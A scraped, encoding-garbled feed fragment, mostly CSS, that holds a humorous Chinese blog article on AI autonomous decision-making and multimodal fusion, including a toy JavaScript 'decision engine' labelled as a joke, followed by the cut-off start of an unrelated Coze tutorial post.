9NtCVKX51Oen+MM6IEYvz5StOehKLpIjD+nKU5AQWJpLizdB+1sb5LQvFRxbSJVGHmSdK/0WWaPguEYmcSJ68aWkK6rAw6jwSSCmrTWVHT96R7HwHANEgqybVJL+E2vE2q7Uu91Gr73SbbNUvZDtiOlCeIv4r/AI+0XUwz1lvcAAAAAElFTkSuQmCC");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>â€œå½“AIå¼€å§‹è‡ªå·±åšå†³å®šï¼Œæˆ‘ä»¬è¦æ‹…å¿ƒçš„ä¸æ˜¯å®ƒæŠ¢å·¥ä½œï¼Œè€Œæ˜¯å®ƒå†™çš„æ–‡æ¡ˆå¯èƒ½æ¯”æˆ‘ä»¬è¿˜æç¬‘ã€‚â€</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ğŸ“˜ ä¸€ã€å‰è¨€ï¼šè®©AIå­¦ä¼šâ€œè‡ªå·±å†³å®šâ€çš„æµªæ¼«ä¸ææ€–</h2>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æ‰“å¼€ä¸€ä¸ªè½¯ä»¶ï¼Œå®ƒä¸å†é—®ä½ â€œæ˜¯å¦ä¿å­˜æ–‡ä»¶â€ï¼Œ<br/>
è€Œæ˜¯çœ‹äº†ä½ ç¥ä¸€çœ¼å±å¹•çš„çœ¼ç¥ã€å¬å‡ºä½ å¹æ°”çš„é¢‘ç‡ã€å†åŠ ä¸Šå‰å‡ å¤©ä½ å‡Œæ™¨ä¸‰ç‚¹è¿˜åœ¨æ”¹ä»£ç çš„è®°å½•â€¦â€¦<br/>
å®ƒå°±<strong>è‡ªå·±å†³å®šå¸®ä½ ä¿å­˜ç„¶åå¼ºåˆ¶ä½ å»ç¡è§‰</strong>ã€‚</p>
<p>ğŸ¤– â€”â€” è¿™ï¼Œå°±æ˜¯â€œAI è‡ªä¸»å†³ç­–â€çš„èŒèŠ½ã€‚</p>
<p>æ‰€è°“ <strong>AI è‡ªä¸»å†³ç­–ï¼ˆAutonomous Decision Makingï¼‰</strong> ï¼Œ<br/>
å¹¶ä¸æ„å‘³ç€AIæœ‰äº†æ„è¯†ï¼Œè€Œæ˜¯èƒ½ï¼š</p>
<ul>
<li>æ ¹æ®è¾“å…¥å†…å®¹ï¼ˆæ–‡æœ¬/å›¾åƒ/è¯­éŸ³ï¼‰ï¼Œ</li>
<li>ä»æ¨¡å‹ä¸ä¸Šä¸‹æ–‡ä¸­æ¨ç†å‡ºæœ€ä¼˜è¡ŒåŠ¨ç­–ç•¥ï¼Œ</li>
<li>å¹¶é€šè¿‡ç­–ç•¥æ‰§è¡Œå™¨ï¼ˆagent/plannerï¼‰å®ç°è¡ŒåŠ¨ã€‚</li>
</ul>
<p>è¿™å¬ä¸Šå»åƒå“²å­¦ï¼Œå®é™…ä¸Šâ€”â€”æ˜¯<strong>ä¸€å †çŸ©é˜µè¿ç®—å’Œå‘é‡ç©ºé—´çš„æµªæ¼«æ‹¼å›¾</strong>ã€‚<br/>
ï¼ˆä½†æˆ‘ä»¬çº¦å®šä¸å†™æ•°å­¦å…¬å¼ğŸ¤«ï¼‰</p>
<hr/>
<h2 data-id="heading-1">ğŸ§  äºŒã€AI å†³ç­–çš„åº•å±‚â€œè„‘å›è·¯â€åŸç†</h2>
<p>AI çš„â€œè‡ªä¸»â€ä¸è¿‡æ˜¯ç¨‹åºåœ¨é«˜ç»´ç©ºé—´ä¸­â€œè‡ªæ°â€çš„ä¸€ç§å¹»è§‰ã€‚<br/>
ä»ç³»ç»Ÿåº•å±‚çœ‹ï¼š</p>
<ol>
<li>
<p><strong>è¾“å…¥å±‚ï¼ˆInputï¼‰</strong> ï¼š<br/>
æ–‡æœ¬ã€å›¾ç‰‡ã€è¯­éŸ³è¢«è½¬åŒ–ä¸ºç»Ÿä¸€çš„æ•°å€¼ç‰¹å¾ã€‚</p>
<ul>
<li>æ–‡æœ¬ â†’ Token Embedding</li>
<li>å›¾ç‰‡ â†’ Vision Encoderï¼ˆå¦‚ViTï¼‰</li>
<li>è¯­éŸ³ â†’ Speech Encoderï¼ˆå¦‚Whisper Encoderï¼‰</li>
</ul>
</li>
<li>
<p><strong>èåˆå±‚ï¼ˆFusionï¼‰</strong> ï¼š<br/>
æ‰€æœ‰æ¨¡æ€å…±åŒæŠ•å°„è¿›åŒä¸€è¯­ä¹‰ç©ºé—´ã€‚<br/>
è¿™ä¸€æ­¥åƒæ˜¯ä¸€ä¸ªAIç‰ˆçš„é…’å§â€”â€”<br/>
æ–‡æœ¬æ˜¯å¥è°ˆçš„è¯—äººï¼Œå›¾åƒæ˜¯å®‰é™çš„ç”»å®¶ï¼Œè¯­éŸ³æ˜¯é‚£ä¸ªçˆ±å”±æ‘‡æ»šçš„ç‰©ç†è€å¸ˆã€‚<br/>
å®ƒä»¬åœ¨è¯­ä¹‰ç©ºé—´å–åˆ°ä¸€èµ·å»äº†ğŸ»ã€‚</p>
</li>
<li>
<p><strong>æ¨ç†å±‚ï¼ˆReasoningï¼‰</strong> ï¼š<br/>
è¿™å°±æ˜¯Transformerä»¬çš„èˆå°ã€‚<br/>
æ¨¡å‹ä¼šåŸºäºâ€œä¸Šä¸‹æ–‡å…³è”â€è®¡ç®—æ¯ä¸ªå¯èƒ½å†³ç­–çš„<strong>ç½®ä¿¡åº¦åˆ†å¸ƒ</strong>ï¼ˆå¯ç†è§£ä¸ºâ€œå®ƒå¤šç›¸ä¿¡è‡ªå·±â€ï¼‰ã€‚<br/>
æœ€ç»ˆçš„é€‰æ‹©æ¥è‡ªäºï¼š</p>
<ul>
<li>å†å²åœºæ™¯è®°å¿†</li>
<li>å¥–åŠ±åé¦ˆï¼ˆReinforcementï¼‰</li>
<li>å†³ç­–æ¸©åº¦ï¼ˆTemperatureï¼‰</li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡Œå±‚ï¼ˆAction Layerï¼‰</strong> ï¼š<br/>
æ¨¡å‹å°†è¾“å‡ºæŒ‡ä»¤æˆ–è¡Œä¸ºï¼ˆç”Ÿæˆæ–‡æœ¬ã€æ§åˆ¶æ¥å£ã€å‘èµ·ä»»åŠ¡è¯·æ±‚ç­‰ï¼‰ã€‚</p>
</li>
</ol>
<hr/>
<h2 data-id="heading-2">ğŸ“¸ ä¸‰ã€æ–‡æœ¬ã€å›¾ç‰‡ã€è¯­éŸ³ï¼šä¸‰å¤§è¾“å…¥æ¨¡æ€çš„äº¤å“æ›²</h2>
<h3 data-id="heading-3">ğŸ™ 1. è¯­éŸ³ -&gt; æ–‡å­—</h3>
<p>è¯­éŸ³è¯†åˆ«ä¸æ˜¯å¬æ‡‚ï¼Œè€Œæ˜¯<strong>é¢‘è°±ç‰¹å¾çš„æ¨¡å¼åŒ¹é…</strong>ã€‚<br/>
AI å¹¶ä¸æ˜¯å¬è§â€œä½ å¥½â€ï¼Œå®ƒåªçŸ¥é“â€”â€”<br/>
â€œåœ¨è¿™ä¸€æ—¶åˆ»çš„å£°æ³¢é¢‘åŸŸå³°å€¼ä¸å·²çŸ¥æ¨¡æ¿å»åˆç¨‹åº¦ = å¾ˆåƒâ€˜ä½ å¥½â€™â€ã€‚</p>
<h3 data-id="heading-4">ğŸ§¾ 2. æ–‡æœ¬ -&gt; è¯­ä¹‰</h3>
<p>æ–‡æœ¬æ˜¯AIä¸–ç•Œçš„DNAï¼Œ<br/>
æ¯ä¸ªè¯éƒ½æ˜¯ä¸€ä¸ªå‘é‡ï¼Œæ¯ä¸ªå¥å­æ˜¯ä¸€æ®µå…³ç³»ç½‘ã€‚<br/>
AI å¹¶ä¸ç†è§£å­—é¢ï¼Œè€Œæ˜¯åœ¨å‘é‡ç©ºé—´ä¸­æ‰¾åˆ°<strong>æœ€æ¥è¿‘â€œæ„ä¹‰â€çš„æ–¹å‘</strong>ã€‚<br/>
ğŸŒˆ <strong>å¯ä»¥ç†è§£ä¸ºï¼šè¯­ä¹‰ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ç©ºé—´åæ ‡çš„å…±é¸£ã€‚</strong></p>
<h3 data-id="heading-5">ğŸ–¼ 3. å›¾ç‰‡ -&gt; è¡¨å¾</h3>
<p>å›¾åƒç‰¹å¾ç»è¿‡å·ç§¯æˆ–è§†è§‰Transformeræå–ï¼Œ<br/>
ç„¶åè½¬åŒ–ä¸ºä¸€ç³»åˆ—çš„â€œå…³é”®è§†è§‰å•å…ƒâ€ã€‚<br/>
æ¯”å¦‚çœ‹åˆ°çŒ«ï¼Œå®ƒä¸ä¼šçœŸçš„çœ‹åˆ°çŒ«ï¼Œè€Œæ˜¯æ•æ‰åˆ°ï¼š</p>
<blockquote>
<p>åœ†å½¢è¾¹ç•Œ + æ¯›å‘çº¹ç† + å¯¹ç§°è€³å½¢ç»“æ„ + å°è€Œé«˜äº®çš„ç³å­”</p>
</blockquote>
<p>ç»“æœå°±æ˜¯ä¸€ä¸ªè®©æœºå™¨èƒ½è¯´â€œåº”è¯¥æ˜¯çŒ«å§ğŸ±â€çš„ç‰¹å¾å‘é‡ã€‚</p>
<hr/>
<h2 data-id="heading-6">ğŸ§© å››ã€å¤šæ¨¡æ€èåˆï¼šè®©æœºå™¨æ‹¥æœ‰â€œæ„Ÿå®˜çš„æ„è¯†â€</h2>
<p>AI è‡ªä¸»å†³ç­–çš„æœ¬è´¨â€”â€”æ˜¯<strong>ç†è§£è·¨æ¨¡æ€ä¸Šä¸‹æ–‡çš„ä¸€è‡´æ€§</strong>ã€‚<br/>
ä¸¾ä¸ªä¾‹å­ ğŸ‘‡</p>
<blockquote>
<p>ç”¨æˆ·å‘æ¥ä¸€å¥è¯ï¼šâ€œè¿™ç”»çœ‹èµ·æ¥æœ‰ç‚¹å­¤ç‹¬ã€‚â€<br/>
åŒæ—¶é™„ä¸Šä¸€å¼ ç°è“è°ƒè¿œå±±å›¾ã€‚</p>
</blockquote>
<p>ç³»ç»Ÿé€šè¿‡ï¼š</p>
<ul>
<li>æ–‡æœ¬è¯­ä¹‰åˆ†æï¼šâ€œå­¤ç‹¬â€æŒ‡æƒ…ç»ªç‰¹å¾</li>
<li>å›¾åƒæƒ…ç»ªç‰¹å¾æå–ï¼šâ€œå†·è‰²è°ƒï¼Œä½é¥±å’Œåº¦â€</li>
</ul>
<p>ğŸŒ« æœ€ç»ˆæ¨¡å‹åˆ¤æ–­ï¼š<br/>
æƒ…ç»ªçŠ¶æ€ä¸€è‡´ï¼Œè§¦å‘â€œå®‰æ…°å‹å¯¹è¯ç­–ç•¥â€ï¼Œç³»ç»Ÿè¾“å‡ºï¼š</p>
<blockquote>
<p>â€œæˆ–è®¸æ­£å› ä¸ºå­¤ç‹¬ï¼Œè¿™å¹…ç”»æ‰æœ‰é‚£ä¹ˆæ·±çš„å‘¼å¸æ„Ÿã€‚â€</p>
</blockquote>
<p>AI å¹¶ä¸æ˜¯æ‡‚äº†å­¤ç‹¬ï¼Œè€Œæ˜¯<strong>å°†ç”¨æˆ·è¾“å…¥çš„ç»Ÿè®¡ç‰¹å¾æ˜ å°„æˆå…±æ„Ÿååº”</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-7">âš™ï¸ äº”ã€å®ç°å±‚ â€”â€” è®©æƒ³æ³•è½åœ°ï¼ˆç”¨JSå°æ¸¸æˆå±•ç¤ºå†³ç­–æµï¼‰</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸€ä¸ªæç®€çš„â€œå¤šæ¨¡æ€AIå†³ç­–å¼•æ“â€ä¼ªå®ç°</span>
<span class="hljs-comment">// ï¼ˆåˆ«çœŸè·‘ï¼Œè¿™åªæ˜¯ç§‘ç ”å¹½é»˜ç‰ˆï¼‰</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AIDecisionEngine</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">memory</span> = [];
  }

  <span class="hljs-comment">// æ¨¡æ‹Ÿå¤šæ¨¡æ€è¾“å…¥</span>
  <span class="hljs-title function_">perceive</span>(<span class="hljs-params">{ text, image, audio }</span>) {
    <span class="hljs-keyword">const</span> textFeature = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">encodeText</span>(text);
    <span class="hljs-keyword">const</span> imgFeature = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">encodeImage</span>(image);
    <span class="hljs-keyword">const</span> audFeature = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">encodeAudio</span>(audio);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fuseFeatures</span>([textFeature, imgFeature, audFeature]);
  }

  <span class="hljs-title function_">encodeText</span>(<span class="hljs-params">text</span>) {
    <span class="hljs-keyword">return</span> text ? text.<span class="hljs-property">length</span> * <span class="hljs-number">0.618</span> : <span class="hljs-number">0</span>; <span class="hljs-comment">// é»„é‡‘æ¯”ä¾‹ä¹±å…¥</span>
  }

  <span class="hljs-title function_">encodeImage</span>(<span class="hljs-params">image</span>) {
    <span class="hljs-keyword">return</span> image ? <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">0.9</span> + <span class="hljs-number">0.1</span> : <span class="hljs-number">0</span>;
  }

  <span class="hljs-title function_">encodeAudio</span>(<span class="hljs-params">audio</span>) {
    <span class="hljs-keyword">return</span> audio ? audio.<span class="hljs-property">volumeLevel</span> / <span class="hljs-number">100</span> : <span class="hljs-number">0</span>;
  }

  <span class="hljs-title function_">fuseFeatures</span>(<span class="hljs-params">features</span>) {
    <span class="hljs-keyword">return</span> features.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b) / features.<span class="hljs-property">length</span>;
  }

  <span class="hljs-title function_">decide</span>(<span class="hljs-params">context</span>) {
    <span class="hljs-keyword">const</span> confidence = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">perceive</span>(context);
    <span class="hljs-keyword">if</span> (confidence &gt; <span class="hljs-number">0.6</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"æ‰§è¡Œç§¯æç­–ç•¥ï¼ˆé¼“åŠ±ã€åˆ›ä½œï¼‰ğŸ¤–"</span>;
    <span class="hljs-keyword">if</span> (confidence &gt; <span class="hljs-number">0.3</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"ä¸­æ€§å›åº”ï¼ˆåˆ†æã€å»ºè®®ï¼‰ğŸ§ "</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-string">"æ¶ˆæç­–ç•¥ï¼ˆå®‰æ…°ã€é™é»˜ï¼‰ğŸŒ™"</span>;
  }
}

<span class="hljs-comment">// æ¨¡æ‹ŸAIå®ä¾‹</span>
<span class="hljs-keyword">const</span> ai = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AIDecisionEngine</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ai.<span class="hljs-title function_">decide</span>({
  <span class="hljs-attr">text</span>: <span class="hljs-string">"å¤©æ°”å¥½æƒ³å“­"</span>,
  <span class="hljs-attr">image</span>: <span class="hljs-string">"grey_clouds.png"</span>,
  <span class="hljs-attr">audio</span>: { <span class="hljs-attr">volumeLevel</span>: <span class="hljs-number">20</span> }
}));
</code></pre>
<p>ğŸ§© è¾“å‡ºå¯èƒ½æ˜¯ï¼š</p>
<blockquote>
<p>â€œæ¶ˆæç­–ç•¥ï¼ˆå®‰æ…°ã€é™é»˜ï¼‰ğŸŒ™â€ï¼Œ<br/>
AI å†³å®šâ€œä¸æ‰“æ‰°ä½ â€ï¼Œè¿™å…¶å®æ˜¯æœ€æ¸©æŸ”çš„æ™ºèƒ½ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">ğŸ“ˆ å…­ã€å¯è¡Œæ€§åˆ†ææ€»ç»“</h2>









































<table><thead><tr><th align="left">æ¨¡å—</th><th align="center">æŠ€æœ¯æˆç†Ÿåº¦</th><th align="center">å®ç°å¯è¡Œæ€§</th><th align="left">æŒ‘æˆ˜</th></tr></thead><tbody><tr><td align="left">è¯­éŸ³è¯†åˆ«</td><td align="center">â­â­â­â­</td><td align="center">âœ…</td><td align="left">ç¯å¢ƒå™ªå£°ä¸å£éŸ³å·®å¼‚</td></tr><tr><td align="left">å›¾åƒç†è§£</td><td align="center">â­â­â­â­</td><td align="center">âœ…</td><td align="left">è¯­ä¹‰æ¨¡ç³Šã€æƒ…ç»ªç†è§£</td></tr><tr><td align="left">æ–‡æœ¬ç†è§£</td><td align="center">â­â­â­â­â­</td><td align="center">âœ…</td><td align="left">é•¿ä¸Šä¸‹æ–‡ä¸æ„å›¾æ­§ä¹‰</td></tr><tr><td align="left">å¤šæ¨¡æ€èåˆ</td><td align="center">â­â­â­</td><td align="center">âš ï¸éƒ¨åˆ†å¯è¡Œ</td><td align="left">ç‰¹å¾ç»Ÿä¸€ç©ºé—´å®šä¹‰</td></tr><tr><td align="left">AI è‡ªä¸»å†³ç­–</td><td align="center">â­â­</td><td align="center">ğŸš§ å‘å±•ä¸­</td><td align="left">å¯è§£é‡Šæ€§ä¸å®‰å…¨æ€§</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-9">ğŸ§­ ä¸ƒã€ç»“è¯­ï¼šAIçš„è‡ªç”±ï¼Œæºè‡ªæˆ‘ä»¬çš„çº¦æŸ</h2>
<p>AI è‡ªä¸»å†³ç­–çš„å®ç°ï¼Œ<br/>
å¹¶ä¸æ˜¯è®©æœºå™¨æ›¿æˆ‘ä»¬æ€è€ƒï¼Œ<br/>
è€Œæ˜¯è®©å®ƒ<strong>åœ¨è¾¹ç•Œå†…æ€è€ƒå¾—æ›´èªæ˜ã€æ›´äººç±»åŒ–ã€‚</strong></p>
<p>æœªæ¥ï¼Œç”¨æˆ·ä¹Ÿè®¸åªéœ€ç”¨å‡ å¥è¯ã€å‡ å¼ å›¾ã€å‡ å£°å¹æ¯ï¼Œ<br/>
å°±èƒ½å”¤èµ·ä¸€æ¬¾è½¯ä»¶çš„çµé­‚ã€‚<br/>
ä½†æˆ‘ä»¬ä»éœ€è®©å®ƒè®°ä½ï¼š</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰£å­ï¼ˆCozeï¼‰å®æˆ˜ï¼šå°çº¢ä¹¦ç¬”è®°å†…å®¹æ‰¹é‡é‡‡é›†åˆ°é£ä¹¦è¡¨æ ¼ï¼Œé…å›¾å¯ç›´æ¥é¢„è§ˆ]]></title>    <link>https://juejin.cn/post/7592483877987729414</link>    <guid>https://juejin.cn/post/7592483877987729414</guid>    <pubDate>2026-01-08T03:12:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592483877987729414" data-draft-id="7592483877987713030" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰£å­ï¼ˆCozeï¼‰å®æˆ˜ï¼šå°çº¢ä¹¦ç¬”è®°å†…å®¹æ‰¹é‡é‡‡é›†åˆ°é£ä¹¦è¡¨æ ¼ï¼Œé…å›¾å¯ç›´æ¥é¢„è§ˆ"/> <meta itemprop="keywords" content="Coze"/> <meta itemprop="datePublished" content="2026-01-08T03:12:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾é³´"/> <meta itemprop="url" content="https://juejin.cn/user/3683842894347076"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰£å­ï¼ˆCozeï¼‰å®æˆ˜ï¼šå°çº¢ä¹¦ç¬”è®°å†…å®¹æ‰¹é‡é‡‡é›†åˆ°é£ä¹¦è¡¨æ ¼ï¼Œé…å›¾å¯ç›´æ¥é¢„è§ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3683842894347076/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾é³´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:12:20.000Z" title="Thu Jan 08 2026 03:12:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul 